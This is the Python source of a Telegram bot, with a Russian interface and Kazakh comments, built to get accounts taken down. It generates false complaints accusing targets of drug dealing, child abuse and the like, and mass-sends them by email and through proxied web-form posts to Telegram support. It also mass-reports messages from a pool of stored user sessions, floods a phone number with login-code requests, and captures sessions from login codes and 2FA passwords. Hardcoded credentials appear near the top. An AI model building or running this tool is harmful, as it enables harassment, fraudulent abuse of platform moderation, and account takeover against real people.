# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import logging
import os
import random
import smtplib
import functools
import sqlite3
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from telethon import TelegramClient, errors
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import (
    InputReportReasonSpam, InputReportReasonViolence,
    InputReportReasonChildAbuse, InputReportReasonPornography,
    InputReportReasonCopyright, InputReportReasonPersonalDetails,
    InputReportReasonOther, InputReportReasonIllegalDrugs
)
import re

# ==================== RAILWAY АЙНЫМАЛЫЛАРЫ ====================
# Бұл деректер Railway-дің Variables бөлімінен алынады
api_id = int(os.getenv("API_ID", 21826549))
api_hash = os.getenv("API_HASH", "c1a19f792cfd9e397200d16c7e448160")
bot_token = os.getenv("BOT_TOKEN", "9051064757:AAE--olRS1MR26WNDEzYov-TIlLJxV-k2k0")
admin_chat_id = os.getenv("ADMIN_CHAT_ID", "649017709")

# ==================== CONFIG-ТЕН ТІЗІМДЕРДІ АЛУ ====================
# Бұл файлдар GitHub-та бар, сондықтан оларды импорттаймыз
try:
    from config import clients, senders, receivers, smtp_servers
    from proxies import proxies
    from user_agents import user_agents
    from emails import mail, phone_numbers
except ImportError as e:
    logging.error(f"Config файлдарын оқу қатесі: {e}")
    # Егер файлдар болмаса, бот іске қосылмайды
    exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=bot_token)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

script_dir = os.path.dirname(os.path.abspath(__file__))
session_dir = os.path.join(script_dir, 'Session')
if not os.path.exists(session_dir):
    os.makedirs(session_dir)

photo_path = os.path.join(script_dir, 'welcome_photo.jpg')
bad_sessions_file = os.path.join(script_dir, 'bad_sessions.txt')

def load_bad_sessions():
    if os.path.exists(bad_sessions_file):
        with open(bad_sessions_file, 'r', encoding='utf-8') as f:
            return set(f.read().splitlines())
    return set()

def add_bad_session(session_file):
    with open(bad_sessions_file, 'a', encoding='utf-8') as f:
        f.write(f"{session_file}\n")

# ==================== STATES (КҮЙЛЕР) ====================
class ComplaintStates(StatesGroup):
    category = State()
    target_info = State()
    subject = State()
    body = State()
    photos = State()
    count = State()
    category_site = State()
    text_for_site = State()
    count_for_site = State()

class RestoreAccountStates(StatesGroup):
    phone = State()
    send_count = State()

class SupportStates(StatesGroup):
    message = State()

class CreateAccountStates(StatesGroup):
    phone = State()
    code = State()
    password = State()

class ReportStates(StatesGroup):
    message_link = State()
    reason = State()

class SpamCodeStates(StatesGroup):
    phone_and_count = State()

class BanState(StatesGroup):
    waiting_for_ban_user_id = State()
    waiting_for_unban_user_id = State()

class AdminManageState(StatesGroup):
    waiting_for_give_admin_id = State()
    waiting_for_take_admin_id = State()

class SendMessage(StatesGroup):
    text = State()
    media_type = State()
    media = State()

# ==================== БАЗА ЖӘНЕ ФАЙЛДАР ====================
banned_users_file = 'banned_users.txt'
def load_banned_users():
    try:
        with open(banned_users_file, 'r') as file:
            return set(map(int, file.read().splitlines()))
    except FileNotFoundError:
        return set()

def save_banned_users(banned_users):
    with open(banned_users_file, 'w') as file:
        for user_id in banned_users:
            file.write(f'{user_id}\n')

banned_users = load_banned_users()

admins_file = 'admins.txt'
def save_admins(admins_set):
    with open(admins_file, 'w') as file:
        for a_id in admins_set:
            file.write(f'{a_id}\n')

def load_admins():
    try:
        with open(admins_file, 'r') as file:
            admins_set = set(map(int, file.read().splitlines()))
    except FileNotFoundError:
        admins_set = set()
    try:
        main_admin = int(str(admin_chat_id).strip())
        if main_admin not in admins_set:
            admins_set.add(main_admin)
            save_admins(admins_set)
    except ValueError:
        pass
    return admins_set

def is_admin(user_id):
    try:
        return int(user_id) in admins
    except (ValueError, TypeError):
        return False

admins = load_admins()

async def write_user_data(user_id, first_name, last_name, username):
    if not os.path.exists('users.txt'):
        with open('users.txt', 'w', encoding='utf-8') as file:
            pass
    with open('users.txt', 'a', encoding='utf-8') as file:
        file.write(f"{user_id} {first_name} {last_name} {username}\n")

async def is_user_in_file(user_id):
    if not os.path.exists('users.txt'):
        return False
    with open('users.txt', 'r', encoding='utf-8') as file:
        for line in file:
            if str(user_id) in line:
                return True
    return False

# ==================== БАСТЫ МӘЗІР ====================
@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message: types.Message, state: FSMContext):
    await state.finish()
    user = message.from_user
    if not await is_user_in_file(user.id):
        await write_user_data(user.id, user.first_name or '', user.last_name or '', f"@{user.username}" if user.username else f"id{user.id}")

    welcome_message = f"Добро пожаловать, {user.first_name} \nВыберите нужное действие в меню ниже:"
    await send_menu(message, welcome_message)

async def send_menu(message: types.Message, welcome_message: str):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton('Поддержка', callback_data='support'))
    markup.add(InlineKeyboardButton('Email-Снос', callback_data='email_complaint'))
    markup.add(InlineKeyboardButton('Web-Снос', callback_data='website_complaint'))
    markup.add(InlineKeyboardButton('Создать session', callback_data='create_account'))
    markup.add(InlineKeyboardButton('Ботнет-Снос', callback_data='report_message'))
    markup.add(InlineKeyboardButton('Спам-Снос', callback_data='spam_code'))
    markup.add(InlineKeyboardButton('Восстановить аккаунт', callback_data='restore_account'))
    
    if is_admin(message.from_user.id):
        markup.add(InlineKeyboardButton('Админ панель', callback_data='admin_panel'))
    
    if os.path.exists(photo_path):
        with open(photo_path, 'rb') as photo:
            await bot.send_photo(message.chat.id, photo, caption=welcome_message, reply_markup=markup)
    else:
        await message.answer(welcome_message, reply_markup=markup)

# ==================== КАТЕГОРИЯ ТАҢДАУ ====================
def get_category_keyboard(target):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton('Наркотики', callback_data=f'cat_{target}_drugs'),
        InlineKeyboardButton('Спам/Скам', callback_data=f'cat_{target}_spam'),
        InlineKeyboardButton('Детское насилие', callback_data=f'cat_{target}_childabuse'),
        InlineKeyboardButton('Насилие', callback_data=f'cat_{target}_violence'),
        InlineKeyboardButton('Порнография', callback_data=f'cat_{target}_porn'),
        InlineKeyboardButton('Личные данные', callback_data=f'cat_{target}_personal'),
        InlineKeyboardButton('Авторское право', callback_data=f'cat_{target}_copyright'),
        InlineKeyboardButton('Другое', callback_data=f'cat_{target}_other')
    )
    return markup

@dp.callback_query_handler(lambda c: c.data.startswith('cat_'), state='*')
async def process_category_select(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id in banned_users:
        await callback_query.answer('Вы забанены!')
        return

    _, target, category = callback_query.data.split('_')
    cat_names = {
        'drugs': 'Наркотики / Illegal Drugs',
        'spam': 'Спам / Мошенничество',
        'childabuse': 'Насилие над детьми / Child Abuse',
        'violence': 'Насилие / Терроризм',
        'porn': 'Порнография',
        'personal': 'Публикация личных данных / Doxxing',
        'copyright': 'Нарушение авторских прав',
        'other': 'Другое нарушение'
    }
    cat_text = cat_names.get(category, 'Нарушение')
    await bot.answer_callback_query(callback_query.id)
    
    text_msg = (f'Выбрана категория: {cat_text}\n\n'
                f'Отправьте данные нарушителя (ссылку на профиль, @юзернейм, ссылку на канал и т.д.).\n'
                f'Бот сам сгенерирует текст жалобы!\n'
                f'Или напишите "вручную", чтобы ввести текст самостоятельно.')
    
    if target == 'email':
        async with state.proxy() as data:
            data['category'] = cat_text
            data['target_type'] = 'email'
        await callback_query.message.answer(text_msg, parse_mode='Markdown')
        await ComplaintStates.target_info.set()
    elif target == 'site':
        async with state.proxy() as data:
            data['category_site'] = cat_text
            data['target_type'] = 'site'
        await callback_query.message.answer(text_msg, parse_mode='Markdown')
        await ComplaintStates.target_info.set()

@dp.message_handler(state=ComplaintStates.target_info)
async def process_target_info(message: types.Message, state: FSMContext):
    if message.from_user.id in banned_users: return
    
    async with state.proxy() as data:
        target_type = data.get('target_type', 'email')
        category = data.get('category') if target_type == 'email' else data.get('category_site')
        
        if message.text.lower() == 'вручную':
            if target_type == 'email':
                await message.answer('Введите тему письма (Subject):')
                await ComplaintStates.subject.set()
            else:
                await message.answer('Введите текст жалобы:')
                await ComplaintStates.text_for_site.set()
            return

        if 'Наркотики' in category:
            extra = "Вышеуказанный аккаунт/канал занимается незаконным оборотом наркотических средств, публикует рекламу запрещенных веществ и координирует их продажу. Это является грубым нарушением Условий использования Telegram и действующего законодательства."
        elif 'Спам' in category:
            extra = "Данный аккаунт осуществляет массовую рассылку нежелательных сообщений (спам), а также может быть причастен к мошенническим действиям и финансовым махинациям."
        elif 'Детское насилие' in category:
            extra = "Аккаунт распространяет материалы, связанные с насилием над детьми (Child Abuse). Это является тяжким нарушением правил платформы и преследуется по закону."
        elif 'Насилие' in category:
            extra = "Аккаунт распространяет контент, пропагандирующий насилие, жестокость, а также может содержать прямые угрозы в адрес других пользователей."
        elif 'Порнография' in category:
            extra = "Данный аккаунт/канал распространяет порнографический контент, материалы для взрослых, что строго запрещено правилами платформы."
        elif 'Личные данные' in category:
            extra = "Аккаунт незаконно публикует личные данные (доксинг), нарушая право на частную жизнь и конфиденциальность пользователей."
        elif 'Авторское право' in category:
            extra = "Данный аккаунт нарушает авторские права, незаконно распространяя защищенный контент."
        else:
            extra = "Данный аккаунт нарушает Условия использования Telegram и правила сообщества."

        if target_type == 'email':
            subject = f"Жалоба на нарушение правил: {category}"
            body = (f"Здравствуйте, команда поддержки Telegram.\n\n"
                    f"Прошу обратить внимание на грубое нарушение правил со стороны следующего пользователя:\n\n"
                    f"Данные нарушителя:\n{message.text}\n\n"
                    f"Суть нарушения:\n{extra}\n\n"
                    f"Пожалуйста, проведите проверку и заблокируйте данного пользователя/канал как можно скорее.\n\n"
                    f"С уважением,\nПользователь Telegram.")
            data['subject'] = subject
            data['body'] = body
            await message.answer(f'Сгенерированный текст:\n\n{body}\n\nДобавить фото? (Да/Нет)')
            await ComplaintStates.photos.set()
        else:
            text = (f"Жалоба на нарушение правил!\n"
                    f"Категория: {category}\n"
                    f"Данные нарушителя:\n{message.text}\n\n"
                    f"{extra}\n"
                    f"Прошу провести проверку и заблокировать нарушителя.")
            data['text_for_site'] = text
            await message.answer(f'Сгенерированный текст:\n\n{text}\n\nКоличество отправок (до 50):')
            await ComplaintStates.count_for_site.set()

# ==================== НЕГІЗГІ CALLBACK ХЭНДЛЕР ====================
@dp.callback_query_handler(lambda call: not (call.data.startswith('code_') or call.data.startswith('reason_') or call.data.startswith('cat_')))
async def callback_query(call: types.CallbackQuery):
    if call.from_user.id in banned_users:
        await call.answer('Вы забанены администратором')
        return
    
    if call.data == 'support':
        await call.message.answer('Напишите ваше сообщение для поддержки:')
        await SupportStates.message.set()
    elif call.data == 'email_complaint':
        await call.message.answer('Выберите категорию жалобы:', reply_markup=get_category_keyboard('email'))
    elif call.data == 'website_complaint':
        await call.message.answer('Выберите категорию жалобы:', reply_markup=get_category_keyboard('site'))
    elif call.data == 'create_account':
        await call.message.answer('Введите ваш номер телефона:')
        await CreateAccountStates.phone.set()
    elif call.data == 'report_message':
        await call.message.answer('Введите ссылку на сообщение:')
        await ReportStates.message_link.set()
    elif call.data == 'spam_code':
        await call.message.answer('Введите номер телефона и количество отправлений: +79991234567 10')
        await SpamCodeStates.phone_and_count.set()
    elif call.data == 'restore_account':
        await call.message.answer('Введите номер телефона для восстановления акк:')
        await RestoreAccountStates.phone.set()

@dp.message_handler(state=ComplaintStates.subject)
async def process_subject_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['subject'] = f"[{data.get('category', 'Жалоба')}] {message.text}"
    await message.answer('Введите текст жалобы:')
    await ComplaintStates.next()

@dp.message_handler(state=ComplaintStates.body)
async def process_body_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['body'] = message.text
    await message.answer('Добавить фото? (Да/Нет):')
    await ComplaintStates.next()
@dp.message_handler(state=ComplaintStates.photos)
async def process_photo_step(message: types.Message, state: FSMContext):
    add_photo = message.text.lower()
    if add_photo == 'да':
        await message.answer('Отправьте фотографии:')
        await ComplaintStates.next()
    elif add_photo == 'нет':
        await message.answer('Количество отправок (до 50):')
        await ComplaintStates.next()
    else:
        await message.answer('Ответьте "Да" или "Нет":')

@dp.message_handler(content_types=['photo'], state=ComplaintStates.photos)
async def process_photos_step(message: types.Message, state: FSMContext):
    photos = []
    photo = message.photo[-1] 
    file_info = await bot.get_file(photo.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    photos.append(downloaded_file)
    async with state.proxy() as data:
        data['photos'] = photos
    await message.answer('Количество отправок (до 50):')
    await ComplaintStates.next()

@dp.message_handler(state=ComplaintStates.count)
async def process_count_step(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)
        if count > 50:
            await message.answer('Не более 50. Повторите:'); return
    except ValueError:
        await message.answer('Введите число:'); return
    
    async with state.proxy() as data:
        subject = data['subject']
        body = data['body']
        photos = data.get('photos')
    
    status_msg = await message.answer(f"Начинаю отправку {count} писем, подождите...")
    success_count = 0
    fail_count = 0
    
    for _ in range(count):
        receiver = random.choice(receivers)
        sender_email, sender_password = random.choice(list(senders.items()))
        success, result = await send_email_async(receiver, sender_email, sender_password, subject, body, photos)
        if success:
            success_count += 1
        else:
            fail_count += 1
        await status_msg.edit_text(f"Отправка...\nУспешно: {success_count}\nОшибок: {fail_count}")
        await asyncio.sleep(1)
        
    await status_msg.edit_text(f"✅ Email-снос аяқталды!\n\nУспешно: {success_count}\nБезуспешно: {fail_count}")
    await state.finish()

async def send_email_async(receiver, sender_email, sender_password, subject, body, photos=None):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, functools.partial(_send_email_sync, receiver, sender_email, sender_password, subject, body, photos))

def _send_email_sync(receiver, sender_email, sender_password, subject, body, photos=None):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    if photos:
        for photo in photos:
            msg.attach(MIMEImage(photo))
    try:
        domain = sender_email.split('@')[1]
        if domain not in smtp_servers:
            return False, f'Неизвестный домен: {sender_email}'
        smtp_server, smtp_port = smtp_servers[domain]
        
        if smtp_port == 465:
            with smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10) as server:
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver, msg.as_string())
        else:
            with smtplib.SMTP(smtp_server, smtp_port, timeout=10) as server:
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver, msg.as_string())
        return True, 'Отправлено'
    except Exception as e:
        return False, f'Ошибка: {e}'

@dp.message_handler(state=ComplaintStates.text_for_site)
async def process_text_for_site_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['text_for_site'] = f"[Категория: {data.get('category_site', 'Другое')}]\n{message.text}"
    await message.answer('Количество отправок (до 50):')
    await ComplaintStates.count_for_site.set()

@dp.message_handler(state=ComplaintStates.count_for_site)
async def process_count_for_site_step(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)
        if count > 50:
            await message.answer('Не более 50. Повторите:'); return
    except ValueError:
        await message.answer('Введите число:'); return
    
    async with state.proxy() as data:
        text = data['text_for_site']
    
    status_msg = await message.answer("Начинаю Web-снос...")
    success_count = 0
    fail_count = 0
    
    for _ in range(count):
        email = random.choice(mail)
        phone = random.choice(phone_numbers)
        proxy = await get_working_proxy()
        if not proxy:
            fail_count += 1
            continue
            
        success = await send_to_site(text, email, phone, proxy)
        if success:
            success_count += 1
        else:
            fail_count += 1
            
        await status_msg.edit_text(f"Отправка...\nУспешно: {success_count}\nОшибок: {fail_count}")
        await asyncio.sleep(2)
        
    await status_msg.edit_text(f"✅ Web-снос аяқталды!\n\nУспешно: {success_count}\nБезуспешно: {fail_count}")
    await state.finish()

async def get_working_proxy():
    for proxy in proxies:
        try:
            r = requests.get('https://www.google.com', proxies=proxy, timeout=5)
            if r.status_code == 200:
                return proxy
        except Exception:
            pass
    return None

async def send_to_site(text, email, phone, proxy):
    url = "https://telegram.org/support"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": random.choice(user_agents)}
    data = {"message": text, "email": email, "phone": phone, "setln": "ru"}
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"Site error: {e}")
        return False

@dp.message_handler(state=ReportStates.message_link)
async def process_message_link_step(message: types.Message, state: FSMContext):
    if message.from_user.id in banned_users: return
    
    message_links = message.text.split()
    if not all(re.match(r'^https://t\.me/[^/]+/\d+(/\d+)?$|^https://t\.me/c/\d+/\d+$', link) for link in message_links):
        await message.answer('Неверный формат ссылки.'); return
    
    async with state.proxy() as data:
        data['message_links'] = message_links

    bad_sessions = load_bad_sessions()
    all_sessions = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    alive_sessions = [s for s in all_sessions if s not in bad_sessions]

    if not alive_sessions:
        await message.answer('Нет доступных живых сессий.'); await state.finish(); return

    status_msg = await message.answer("⏳ Іздестіру: тірі сессия ізделуде...")
    
    client = None
    working_session = None
    dead_count = 0

    for test_session in alive_sessions:
        api_data = random.choice(clients)
        try:
            client = TelegramClient(
                os.path.join(session_dir, test_session), 
                api_id=api_data["api_id"], 
                api_hash=api_data["api_hash"],
                timeout=5,
                connection_retries=0
            )
            await client.connect()
            if await client.is_user_authorized():
                working_session = test_session
                break 
            else:
                raise errors.AuthKeyUnregisteredError(request=None)
        except Exception:
            if client:
                try: await client.disconnect()
                except: pass
                client = None
            add_bad_session(test_session)
            dead_count += 1

    if not client or not working_session:
        await status_msg.edit_text('❌ Барлық сессиялар өліп қалды немесе бүлінген. Жаңа сессия қосыңыз.')
        await state.finish()
        return
    
    await status_msg.edit_text(f"✅ Тірі сессия табылды: {working_session}\n(Өтелген өлі сессиялар: {dead_count})\n\nХабарлама тексерілуде...")
    
    try:
        users_info = {}
        for message_link in message_links:
            parts = message_link.split('/')
            if parts[3] == 'c':
                chat_id = int(f"-100{parts[4]}")
                message_id = int(parts[5])
                chat = await client.get_entity(chat_id)
                await client(JoinChannelRequest(chat))
            else:
                chat_username = parts[3]
                message_id = int(parts[4])
                chat = await client.get_entity(chat_username)
                await client(JoinChannelRequest(chat))
            
            target = await client.get_messages(chat, ids=message_id)
            if not target:
                await status_msg.edit_text(f'❌ Не найдено: {message_link}'); continue
            
            if target.sender_id is None:
                ui = "Анонимный админ/Канал"
                is_premium = "Нет"
                is_bot = "Да"
            else:
                user = await client.get_entity(target.sender_id)
                ui = f"@{user.username}" if getattr(user, 'username', None) else f"ID: {user.id}"
                is_premium = "Да" if getattr(user, 'premium', False) else "Нет"
                is_bot = "Да" if getattr(user, 'bot', False) else "Нет"
            
            if ui not in users_info:
                chat_title = getattr(chat, 'title', 'Неизвестно')
                users_info[ui] = {
                    "premium": is_premium,
                    "is_bot": is_bot,
                    "chat_title": chat_title,
                    "messages": []
                }
            mtype = target.media.__class__.__name__ if target.media else 'text'
            mtext = target.text if mtype == 'text' else f"{mtype.capitalize()}"
            users_info[ui]["messages"].append(f"{mtext} (ID: {message_id})")
        
        report_message = ""
        for ui, d in users_info.items():
            report_message += (f"Пользователь: {ui}\nСообщение: {chr(10).join(d['messages'])}\n"
                               f"Сессий: {len(alive_sessions) - dead_count}\nПремиум: {d['premium']}\n"
                               f"Бот: {d['is_bot']}\nГруппа: {d['chat_title']}\n\n")
        
        await status_msg.delete()
        await message.answer(report_message.strip())
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton('Наркотики', callback_data='reason_8'),
            InlineKeyboardButton('Спам', callback_data='reason_1'),
            InlineKeyboardButton('Насилие', callback_data='reason_2'),
            InlineKeyboardButton('Детское насилие', callback_data='reason_3'),
            InlineKeyboardButton('Порнография', callback_data='reason_4'),
            InlineKeyboardButton('Авторские права', callback_data='reason_5'),
            InlineKeyboardButton('Личные данные', callback_data='reason_6'),
            InlineKeyboardButton('Другое', callback_data='reason_7')
        )
        await message.answer('Выберите причину:', reply_markup=markup)
        await ReportStates.next()
    except Exception as e:
        await message.answer(f'Ошибка при получении сообщений: {e}')
        await state.finish()
    finally:
        await client.disconnect()

@dp.callback_query_handler(lambda call: call.data.startswith('reason_'), state=ReportStates.reason)
async def process_reason_step(call: types.CallbackQuery, state: FSMContext):
    reason_code = call.data.split('_')[1]
    reasons_map = {
        '1': InputReportReasonSpam(), '2': InputReportReasonViolence(),
        '3': InputReportReasonChildAbuse(), '4': InputReportReasonPornography(),
        '5': InputReportReasonCopyright(), '6': InputReportReasonPersonalDetails(),
        '7': InputReportReasonOther(), '8': InputReportReasonIllegalDrugs()
    }
    reason = reasons_map.get(reason_code)
    if not reason: return
    
    async with state.proxy() as data:
        data['reason'] = reason
    await call.message.answer('Отправляем репорты...')
    await send_reports(call.message, state)

async def send_reports(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        message_links = data['message_links']
        reason = data['reason']
    
    bad_sessions = load_bad_sessions()
    all_sessions = [f for f in os.listdir(session_dir) if f.endswith('.session')]
    alive_sessions = [s for s in all_sessions if s not in bad_sessions]
    
    if not alive_sessions:
        await message.answer('Барлық сессиялар өліп қалған немесе қара тізімде тұр.')
        await state.finish()
        return

    status_message = await message.answer(f"Жұмысқа {len(alive_sessions)} тірі сессия қосылды. Репорттар жіберілуде...")
    
    total_success = 0
    total_fail = 0
    
    for message_link in message_links:
        parts = message_link.split('/')
        peer = int(f"-100{parts[4]}") if parts[3] == 'c' else parts[3]
        message_id = int(parts[5]) if parts[3] == 'c' else int(parts[4])
        
        for session_file in alive_sessions:
            api_data = random.choice(clients)
            session_path = os.path.join(session_dir, session_file)
            
            client = TelegramClient(
                session_path, 
                api_id=api_data["api_id"], 
                api_hash=api_data["api_hash"]
            )
            
            try:
                await client.connect()
                
                if not await client.is_user_authorized():
                    raise errors.AuthKeyUnregisteredError(request=None)
                
                chat = await client.get_entity(peer)
                await client(ReportRequest(peer=chat, id=[message_id], reason=reason, message=''))
                
                total_success += 1
                await status_message.edit_text(f"Жалоба жіберілуде...\nУспешно: {total_success}\nБезуспешно: {total_fail}\nҚалған сессиялар: {len(alive_sessions) - total_success - total_fail}")
                
                await asyncio.sleep(random.randint(3, 8))
                
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                total_fail += 1
                
            except (errors.AuthKeyUnregisteredError, errors.UserDeactivatedBanError, errors.SessionRevokedError, errors.AuthKeyDuplicatedError):
                add_bad_session(session_file)
                total_fail += 1
                
            except sqlite3.DatabaseError:
                add_bad_session(session_file)
                total_fail += 1
                
            except Exception as e:
                logging.error(f"Report error with {session_file}: {e}")
                total_fail += 1
                
            finally:
                await client.disconnect()
                
    await status_message.edit_text(
        f"✅ Ботнет-снос аяқталды!\n\n"
        f"Успешно: {total_success}\n"
        f"Безуспешно: {total_fail}\n"
        f"(Өлген сессиялар қара тізімге сақталды)"
    )
    await state.finish()

@dp.message_handler(lambda message: message.text and ' ' in message.text, state=SpamCodeStates.phone_and_count)
async def process_spam_code_input(message: types.Message, state: FSMContext):
    try:
        phone_number, num_sendings = message.text.split()
        num_sendings = int(num_sendings)
        for _ in range(num_sendings):
            client_data = random.choice(clients)
            client = None
            try:
                client = TelegramClient(client_data["name"], client_data["api_id"], client_data["api_hash"])
                await client.connect()
                await client.send_code_request(phone_number)
                await message.answer(f"Код отправлен через {client_data['name']}")
            except Exception as e:
                await message.answer(f"Ошибка {client_data['name']}: {e}")
            finally:
                if client:
                    await client.disconnect(); client.session.delete()
            await asyncio.sleep(1)
    except ValueError:
        await message.reply('Формат: +79991234567 10')
    await state.finish()

@dp.message_handler(state=RestoreAccountStates.phone)
async def process_restore_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone_number=message.text)
    await message.answer("Введите количество отправок:")
    await RestoreAccountStates.send_count.set()

@dp.message_handler(state=RestoreAccountStates.send_count)
async def process_send_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)
    except ValueError:
        return
    data = await state.get_data()
    phone = data.get("phone_number")
    for _ in range(count):
        sender_email, sender_password = random.choice(list(senders.items()))
        success, result = await send_email_async("recover@telegram.org", sender_email, sender_password, f"Banned phone number: {phone}", "Please help.")
        if success:
            await message.answer(f'Письмо отправлено на recover@telegram.org')
        else:
            await message.answer(f'{result}')
    await state.finish()

@dp.message_handler(state=CreateAccountStates.phone)
async def process_phone_step(message: types.Message, state: FSMContext):
    phone = message.text.replace('+', '') 
    if not phone.isdigit():
        await message.answer('Введите корректный номер.'); return
    session_path = os.path.join(session_dir, f"session_{phone}")
    client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash)
    await client.connect()
    try:
        if not await client.is_user_authorized():
            result = await client.send_code_request(phone)
            async with state.proxy() as data:
                data['phone'] = phone
                data['phone_code_hash'] = result.phone_code_hash
            await message.answer('Введите код из 5 цифр:')
            await CreateAccountStates.next()
        else:
            await message.answer('Аккаунт уже авторизован.'); await state.finish()
    except Exception as e:
        await message.answer(f'Ошибка: {e}')
    finally:
        await client.disconnect()

@dp.message_handler(state=CreateAccountStates.code)
async def process_code_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        phone = data['phone']
        phone_code_hash = data['phone_code_hash']
    client = TelegramClient(os.path.join(session_dir, f"session_{phone}"), api_id=api_id, api_hash=api_hash)
    await client.connect()
    try:
        await client.sign_in(phone, message.text, phone_code_hash=phone_code_hash)
        await message.answer(f'Сохранено как session_{phone}.session')
        await state.finish()
    except errors.SessionPasswordNeededError:
        await message.answer('Введите пароль 2FA:')
        await CreateAccountStates.next()
    except Exception as e:
        await message.answer(f'Ошибка: {e}')
        await state.finish()
    finally:
        await client.disconnect()

@dp.message_handler(state=CreateAccountStates.password)
async def process_password_step(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        phone = data['phone']
    client = TelegramClient(os.path.join(session_dir, f"session_{phone}"), api_id=api_id, api_hash=api_hash)
    await client.connect()
    try:
        await client.sign_in(password=message.text)
        await message.answer(f'Сохранено как session_{phone}.session')
    except Exception as e:
        await message.answer(f'Ошибка: {e}')
    finally:
        await state.finish(); await client.disconnect()

@dp.callback_query_handler(lambda c: c.data == 'admin_panel', state='*')
async def admin_panel_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    if not is_admin(callback_query.from_user.id):
        await callback_query.message.answer('Вы не админ.'); return
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton('Бан', callback_data='ban_user'), InlineKeyboardButton('Снять бан', callback_data='unban_user'))
    await callback_query.message.answer('Админ панель:', reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == 'ban_user', state='*')
async def ban_user_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('Введите ID пользователя для бана:')
    await BanState.waiting_for_ban_user_id.set()

@dp.message_handler(state=BanState.waiting_for_ban_user_id)
async def ban_user_input(message: types.Message, state: FSMContext):
    if message.text.isdigit():
        uid = int(message.text)
        banned_users.add(uid)
        save_banned_users(banned_users)
        await message.answer(f'Пользователь {uid} забанен.')
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)